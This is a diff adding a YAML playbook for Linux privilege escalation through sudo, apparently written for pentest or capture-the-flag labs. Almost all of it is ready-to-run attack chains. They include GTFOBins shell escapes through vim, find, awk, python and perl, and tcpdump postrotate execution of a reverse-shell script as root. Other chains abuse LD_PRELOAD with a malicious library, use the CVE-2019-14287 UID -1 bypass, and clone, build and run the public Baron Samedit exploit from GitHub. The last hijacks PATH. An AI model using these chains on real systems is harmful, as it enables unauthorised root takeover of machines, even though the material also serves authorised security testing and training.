@@ -1,0 +1,241 @@
+name: Linux Privilege Escalation - Sudo
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE SUDO
+# =========================================================
+- title: Enumerate Sudo Permissions
+  mode: enum
+  info: |
+    Enumerate sudo privileges and identify dangerous configurations.
+
+  entries:
+
+    - cmd: "sudo -l"
+      info: enumerate sudo permissions
+
+      look_for:
+        - "NOPASSWD"
+        - "SETENV"
+        - "ALL=(ALL)"
+        - "ALL=(root)"
+        - "GTFOBins"
+        - "custom binaries"
+        - "scripts"
+        - "wildcards"
+
+    - cmd: "sudo -V | head -n1"
+      info: identify sudo version
+
+    - cmd: "cat /etc/sudoers"
+      info: inspect sudoers configuration
+
+    - cmd: "ls -la /etc/sudoers.d/"
+      info: inspect additional sudo rules
+
+  notes:
+    - sudo misconfigurations are extremely common
+    - custom scripts and binaries are highest priority
+    - always check sudo version for known CVEs
+
+# =========================================================
+# [2] GTFOBINS QUICK WINS
+# =========================================================
+- title: GTFOBins Quick Wins
+  mode: manual
+  info: |
+    Common sudo binaries that immediately lead to shells.
+
+  entries:
+
+    - cmd: "sudo vim -c ':!/bin/sh'"
+      info: vim shell escape
+
+    - cmd: "sudo less /etc/passwd"
+      info: then type !sh
+
+    - cmd: "sudo find . -exec /bin/sh \\; -quit"
+      info: find shell escape
+
+    - cmd: "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
+      info: awk shell escape
+
+    - cmd: "sudo python3 -c 'import os; os.system(\"/bin/sh\")'"
+      info: python shell escape
+
+    - cmd: "sudo perl -e 'exec \"/bin/sh\";'"
+      info: perl shell escape
+
+    - cmd: "sudo bash -p"
+      info: preserve privileges shell
+
+  notes:
+    - check GTFOBins for additional binaries
+    - NOPASSWD entries are highest priority
+    - custom binaries often easier than GTFOBins
+
+# =========================================================
+# [3] TCPDUMP POSTROTATE ABUSE
+# =========================================================
+- title: Tcpdump Postrotate Abuse
+  mode: chain
+  info: |
+    Abuse tcpdump postrotate-command execution.
+
+  entries:
+
+    - cmd: "sudo -l"
+      info: verify tcpdump sudo rights
+
+      look_for:
+        - "tcpdump"
+
+    - cmd: "ip a"
+      info: identify network interfaces
+
+    - cmd: "nano /tmp/.test"
+      info: create reverse shell script
+
+    - cmd: "chmod +x /tmp/.test"
+      info: make payload executable
+
+    - cmd: "sudo tcpdump -ln -i <iface> -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root"
+      info: execute payload as root
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - requires sudo access to tcpdump
+    - AppArmor blocks this on some systems
+    - replace reverse shell with local payload if needed
+
+# =========================================================
+# [4] LD_PRELOAD ABUSE
+# =========================================================
+- title: LD_PRELOAD Privilege Escalation
+  mode: chain
+  info: |
+    Abuse sudo env_keep+=LD_PRELOAD configuration.
+
+  entries:
+
+    - cmd: "sudo -l"
+      info: verify LD_PRELOAD support
+
+      look_for:
+        - "env_keep+=LD_PRELOAD"
+
+    - cmd: "nano root.c"
+      info: create malicious shared library
+
+    - cmd: "gcc -fPIC -shared -o root.so root.c -nostartfiles"
+      info: compile malicious library
+
+    - cmd: "sudo LD_PRELOAD=/tmp/root.so <binary>"
+      info: execute binary with malicious preload
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - requires LD_PRELOAD preservation
+    - target binary must be sudo-executable
+    - works even when binary is not a GTFOBin
+
+# =========================================================
+# [5] SUDO POLICY BYPASS (CVE-2019-14287)
+# =========================================================
+- title: Sudo Policy Bypass (CVE-2019-14287)
+  mode: chain
+  info: |
+    Exploit UID -1 sudo bypass.
+
+  entries:
+
+    - cmd: "sudo -V"
+      info: verify vulnerable version
+
+    - cmd: "sudo -l"
+      info: identify allowed commands
+
+    - cmd: "sudo -u#-1 /bin/bash"
+      info: attempt root shell
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - affects sudo versions below 1.8.28
+    - requires sudo rule allowing command execution
+    - UID -1 resolves to UID 0
+
+# =========================================================
+# [6] BARON SAMEDIT (CVE-2021-3156)
+# =========================================================
+- title: Baron Samedit (CVE-2021-3156)
+  mode: chain
+  info: |
+    Heap overflow in sudo allowing root privilege escalation.
+
+  entries:
+
+    - cmd: "sudo -V"
+      info: identify sudo version
+
+    - cmd: "cat /etc/lsb-release"
+      info: identify operating system
+
+    - cmd: "git clone https://github.com/blasty/CVE-2021-3156.git"
+      info: clone exploit
+
+    - cmd: "cd CVE-2021-3156 && make"
+      info: compile exploit
+
+    - cmd: "./sudo-hax-me-a-sandwich"
+      info: list supported targets
+
+    - cmd: "./sudo-hax-me-a-sandwich <target>"
+      info: run exploit
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - affects many sudo versions before patch
+    - may cause instability on some systems
+    - common in older HTB/PG machines
+
+# =========================================================
+# [7] PATH ABUSE
+# =========================================================
+- title: Sudo PATH Abuse
+  mode: chain
+  info: |
+    Abuse sudo rules using relative binary paths.
+
+  entries:
+
+    - cmd: "sudo -l"
+      info: identify commands without absolute paths
+
+    - cmd: "echo '/bin/bash' > <binary>"
+      info: create malicious replacement
+
+    - cmd: "chmod +x <binary>"
+      info: make payload executable
+
+    - cmd: "export PATH=.:$PATH"
+      info: prepend current directory to PATH
+
+    - cmd: "sudo <command>"
+      info: trigger malicious binary
+
+    - cmd: "id"
+      info: verify privileges
+
+  notes:
+    - works when sudoers uses relative binary names
+    - absolute paths mitigate this issue
+    - very common real-world misconfiguration
